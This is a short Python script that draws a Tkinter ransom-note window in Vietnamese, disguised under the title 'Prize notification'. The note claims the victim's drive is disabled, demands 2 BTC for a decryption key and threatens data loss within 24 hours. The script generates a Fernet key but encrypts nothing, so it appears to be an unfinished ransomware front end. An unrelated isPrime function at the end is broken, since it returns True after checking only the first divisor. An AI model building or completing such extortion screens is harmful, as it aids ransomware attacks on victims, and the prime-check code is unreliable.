import os
from cryptography.fernet import Fernet
from tkinter import messagebox
import os
import base64
import tkinter as tk
key = Fernet.generate_key()
print(key)
def check_input():
    input_key = entry.get()
    b = (bytes(input_key, 'utf-8'))
    print(b)
root = tk.Tk()
root.title("Thông báo giải thưởng")
root.geometry("800x400")

message = """Ổ đĩa {} của bạn đã bị vô hiệu hóa.
Vui lòng thanh toán 2 BTC để nhận được key giải mã.
Thông tin liên hệ ở D:/info.txt.
Liên hệ sau 24h tiếp theo kể từ {} để tránh mất dữ liệu.""".format(1, 1)
label = tk.Label(root, text=message, font=("Arial", 14))
label.pack(pady=10)

font_size = 14

username_label = tk.Label(root, text="Username", font=("Arial", font_size))
username_label.pack()
entry = tk.Entry(root, width=30, font=("Arial", font_size))
entry.pack(pady=5)

confirm_button = tk.Button(root, text="Xác nhận", command=check_input, font=("Arial", font_size))
confirm_button.pack(pady=10)

root.mainloop()

def isPrime(n):
    if n <= 1:
        return False
    for i in range(2, int(n**0.5) + 1):
        if n % i == 0:
            return False
        return True
    